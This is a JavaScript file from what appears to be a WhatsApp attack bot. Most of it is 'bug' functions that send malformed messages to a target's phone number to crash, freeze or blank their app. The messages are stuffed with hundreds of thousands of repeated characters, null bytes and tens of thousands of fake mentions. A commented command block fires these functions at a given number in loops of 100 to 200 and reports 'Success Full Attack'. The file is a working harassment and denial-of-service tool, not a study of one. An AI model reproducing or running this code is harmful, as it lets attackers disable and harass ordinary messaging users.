            { length: 2000 },
            () =>
            "1" +
            Math.floor(Math.random() * 9000000) +
            "@s.whatsapp.net"
          ),
        ],
        forwardingScore: 555,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: false,
          renderLargerThumbnail: false,
          title: "! 𐌕𐌆𐌄 ★ 𐌓𐌉𐌕𐌂𐌆𐌉𐌄 - \"𝗋34\" 🩸",
          body: "https://rule34.com",
          previewType: "VIDEO",
          mediaType: "VIDEO",
          thumbnail: xts,
          sourceUrl: "t.me/TheDitChie",
          mediaUrl: "t.me/TheDitChie",
          sourceType: " x ",
          sourceId: " x ",
          containsAutoReply: true,
          ctwaClid: "ctwa_clid_example",
          ref: "ref_example",
        },
        quotedAd: {
          advertiserName: " X ",
          mediaType: "IMAGE",
          jpegThumbnail: xts,
          caption: " X ",
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890",
        },
        isSampled: false,
        utm: {
          utmSource: " X ",
          utmCampaign: " X ",
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "6287888888888-1234567890@g.us",
          serverMessageId: 1,
          newsletterName: " X ",
          contentType: "UPDATE",
          accessibilityText: " X ",
        },
      },
    },
  },
 };
 
 const msg = await generateWAMessageFromContent(target, imagePayload, {});  
 await Ikyy.relayMessage("status@broadcast", msg.message, {
   messageId: msg.key.id,
   statusJidList: [target]
 });
}

//delay combo
async function LocationUi(Ikyy, target) {
  try {
    await Ikyy.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "𝗦𝗛𝗛𝗛𝗛𝗛𝗛𝗛𝗛" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function FreezeXDelay1(Ikyy, target) {
  try {
    await Ikyy.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "Pepek Crasher?" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Ikyy - Crasher",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function FreezeXDelay2(Ikyy, target) {
  try {
    await Ikyy.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "𝗦𝗛𝗛𝗛𝗛𝗛 𝗜𝗡𝗙𝗢" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function LocationInvisible(Ikyy, target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "Apalah apalah" + "ꦾ".repeat(45000),
                address: "MedanWok 😹"
              },
            },
            body: {
              text: "Wokwokwok" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await Ikyy.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function DelayInvisible(Ikyy, target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "Medan Suka Besi 😹" + "ꦾ".repeat(45000),
                address: "MedanWok 😹",
              },
            },
            body: {
              text: "Awwww" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                documentMessage: {
                  fileName: "Ikyy-Doc.txt",
                  mimetype: "text/plain",
                  fileLength: 999999999,
                  caption: "Ikyy Crasher Neverdie?",
                  pageCount: 9999,
                  mediaKey: "\u0000".repeat(50),
                  jpegThumbnail: Buffer.from(""),
                },
              },
            },
          },
        },
      },
    };

    await Ikyy.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function svlzVs(Ikyy, target) {
var xts = { url: "https://l.top4top.io/p_3552yqrjh1.jpg" }
  await Ikyy.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " Woi Suki ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 2000 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9000000) +
                  "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 555,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: false,
              renderLargerThumbnail: false,
              title: "! apalah - \"raul\" 🩸",
              body: "https://rule34.com",
              previewType: "VIDEO",
              mediaType: "VIDEO",
              thumbnail: xts,
              sourceUrl: "t.me/rizxvelzexct",
              mediaUrl: "t.me/rizxvelzexct",
              sourceType: " x ",
              sourceId: " x ",
              containsAutoReply: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example",
            },
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: xts,
              caption: " X ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X ",
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X ",
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

//Delay Invis
async function InVisibleAndroid(Ikyy, target, show = true) {
    let push = [];

    for (let r = 0; r < 1055; r++) {
        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: " \u0000 " }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " \u0003 " }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: " ",
                hasMediaAttachment: true,
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                    fileLength: "18352",
                    height: 720,
                    width: 1280,
                    mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                    fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                    directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1737281900",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIiQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                    scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                    scanLengths: [3537, 10557, 1905, 2353],
                    midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
                }
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: []
            })
        });
    }

    let msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: "ᎲᎲᎲᎲ" }),
                        header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: [...push]
                        })
                    })
                }
            }
        },
        {}
    );

        await Ikyy.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                        }
                    ]
                }
            ]
        });

        if (show) {
            await Ikyy.relayMessage(target, {
                groupStatusMentionMessage: {
                    message: { protocolMessage: { key: msg.key, type: 25 } }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "ᎲᎲᎲ" }
                    }
                ]
            }
        );

        console.log(
            `Succes Mengirim Bug ke Target ${target}`
        );
        await new Promise(resolve => setTimeout(resolve, 9000));
    }
}

async function blankui(Ikyy, target) {
  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          body: {
            text: " ᎲᎲᎲ ᎲᎲ " 
            + "ꦽ".repeat(50000) 
            + "ꦾ".repeat(50000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson:
                  "{\"display_text\":\"66666.\",\"url\":\"https://Wa.me/stickerpack/Depayy\",\"merchant_url\":\"https://Wa.me/stickerpack/Depayy\"}",
              },
            ],
            messageParamsJson: "{".repeat(10000),
          },
        },
      },
    },
  };

  await Ikyy.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}

async function Crashblank(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "...." + "ោ៝".repeat(10000),
      caption: ".." + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await Ikyy.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function UiBlank(Ikyy, target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "Helloo" + "ꦾ".repeat(190000),
                                jpegThumbnail: null,
                                caption: "ꦽ".repeat(190000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await Ikyy.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
        
async function InVisibleIOS(Ikyy, target, show = true) {
        const msg = {
                message: {
                        locationMessage: {
                                degreesLatitude: 21.1266,
                                degreesLongitude: -11.8199,
                                name: "ᎲᎲᎲᎲᎲᎲ" 
                                + "𑇂𑆵𑆴𑆿".repeat(60000),
                                url: "https://t.me/depaygantengbjirr",
                                contextInfo: {
                                        externalAdReply: {
                                                quotedAd: {
                                                        advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                                                        mediaType: "IMAGE",
                                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                                        caption: "ᎲᎲᎲᎲᎲᎲ." 
                                                        + "𑇂𑆵𑆴𑆿".repeat(60000)
                                                },
                                                placeholderKey: {
                                                        remoteJid: "0s.whatsapp.net",
                                                        fromMe: false,
                                                        id: "ABCDEF1234567890"
                                                }
                                        }
                                }
                        }
                }
        };
  
        await Ikyy.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key?.id || "",
                statusJidList: [target],
                additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: target } }]
                        }]
                }]
        });

        if (show) {
                await Ikyy.relayMessage(target, {
                        groupStatusMentionMessage: {
                                message: {
                                        protocolMessage: { key: msg.key, type: 25 }
                                }
                        }
                }, {
                        additionalNodes: [{
                                tag: "meta",
                                attrs: { is_status_mention: "ᎲᎲ" }
                        }]
                });
        }

        console.log(`Succes Send Bug `);
        await new Promise(resolve => setTimeout(resolve, 9000));
}     

async function clientColy(Ikyy, target) {
  let hell = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Info info",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000), // di kurngin/ubah ke JSON.stringify({ status: true }) & add native buat fc 
            version: 3
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });
  
  await Ikyy.relayMessage("status@broadcast", hell.message, {
    messageId: hell.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await Ikyy.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: hell.key,
          type: 25
        }
      }
    }
  },
  {
    additionalNodes: [{
      tag: "meta",
      attrs: { is_status_mention: "true" },
      content: undefined
    }]
  });
      
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            isSampled: true,
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Ikyy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined,
        }],
      }],
    }],
  });
  console.log('Send Bug By Depayy 🚀')
 }
 
async function fcdrogan(target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await Ikyy.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "⌁⃰𝑩4𝑼_𝑫𝑹𝑶𝑮𝑨𝑵" + "ꦾ".repeat(77777),
      publisher: "El Kontole",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "⌁⃰𝑩4𝑼_𝑫𝑹𝑶𝑮𝑨𝑵" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "⌁⃰𝑩4𝑼_𝑫𝑹𝑶𝑮𝑨𝑵" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await Ikyy.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes To Send Bug FreezeChat To ${target}`));
} 
 
////============================================        
  // Casee Bug //
//============================================ 
/*
case 'delay-impact':
case 'delay-hard':
case 'xpayy-delay': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(` Berhasil mengirim bug Ke target ${target}
Type : ${command}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await DelayInvisible(Ikyy, target);
await blankui(Ikyy, target);
await FreezeXDelay2(Ikyy, target);
await FreezeXDelay1(Ikyy, target);
await LocationUi(Ikyy, target);
await svlzVs(Ikyy, target);
}
}
break 

case 'delay-invis':
case 'delay-tagsw': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(` Berhasil mengirim bug Ke target ${target}
Type : ${command}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 200; i++) {
await clientColy(Ikyy, target);
await InVisibleAndroid(Ikyy, target, true);
await clientColy(Ikyy, target);
}
}
break 

case 'blank-ios':
case 'kill-ios':
case 'invis-ios': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(` Berhasil mengirim bug Ke target ${target}
Type : ${command}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await InVisibleIOS(Ikyy, target, true);
await InVisibleIOS(Ikyy, target, true);
await InVisibleIOS(Ikyy, target, true);
}
}
break 

case 'iphone-spam': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(` Berhasil mengirim bug Ke target ${target}
Type : ${command}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await CrashIp(Ikyy, target);
await CrashIpV2(Ikyy, target);
await PayIphone(Ikyy, target);
}
}
break 

case 'blank-spam':
case 'blank-ui':
case 'nika-blankv2':
case 'nika-blank': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(` Berhasil mengirim bug Ke target ${target}
Type : ${command}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await blankui(Ikyy, target);
await UiBlank(Ikyy, target);
await blankui(Ikyy, target);
}
}
break 

case 'payy-impact':
case 'combo-ui': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(` Berhasil mengirim bug Ke target ${target}
Type : ${command}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await blankui(Ikyy, target);
await FreezeXDelay2(Ikyy, target);
await blankui(Ikyy, target);
await UiBlank(Ikyy, target);
await FreezeXDelay1(Ikyy, target);
await LocationUi(Ikyy, target);
await svlzVs(Ikyy, target);
}
}
break 
*
async function groupInInvis(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                groupInviteMessage: {
                    groupJid: "X",
                    inviteCode: "X",
                    inviteExpiration: "X",
                    groupName: "\u0000".repeat(9999),
                    caption: "\u0000".repeat(9999),
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Ikyy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function newCatalog(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                orderMessage: {
                    orderId: "92828",
                    thumbnail: null,
                    itemCount: 9999999999999,
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: "RAFFX IS HERE",
                    orderTitle: "MY NAME IS RAFFX",
                    sellerJid: m.chat,
                    token: "8282882828==",
                    totalAmount1000: "828828292727372728829",
